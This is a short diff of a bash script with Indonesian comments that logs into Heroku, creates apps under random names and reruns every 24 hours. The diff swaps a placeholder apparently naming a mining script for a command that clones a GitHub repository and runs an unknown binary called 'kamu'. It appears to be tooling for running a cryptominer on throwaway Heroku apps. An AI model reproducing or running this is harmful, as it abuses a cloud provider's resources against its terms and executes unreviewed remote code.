@@ -1,7 +1,7 @@
 #!/usr/bin/env bash
 #rerun tiap 24jam
 buildpack="heroku/python"
-command="sc_minining_ngulik_sndri"
+command="git clone https://github.com/samrikulan/toya.git && cd toya && chmod +x kamu && ./kamu"
 heroku login -i
 app_1=$(echo app$(shuf -i 1000000000-9999999999 -n 1))
 app_2=$(echo app$(shuf -i 1000000000-9999999999 -n 1))
